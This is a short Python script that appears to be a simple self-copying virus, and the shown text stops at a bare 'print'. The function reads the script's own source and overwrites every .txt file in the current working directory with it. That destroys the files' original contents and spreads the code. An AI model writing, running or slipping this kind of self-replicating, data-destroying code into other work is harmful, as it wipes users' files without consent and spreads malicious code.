import os
import sys

def copy_to_files():
    # Read the contents of the script itself
    with open(sys.argv[0], 'r') as script:
        script_content = script.read()
    
    # Get the current directory
    current_directory = os.getcwd()
    
    # Iterate over all files in the directory
    for filename in os.listdir(current_directory):
        if filename.endswith('.txt') and filename != os.path.basename(sys.argv[0]):
            with open(filename, 'w') as target_file:
                target_file.write(script_content)
            print
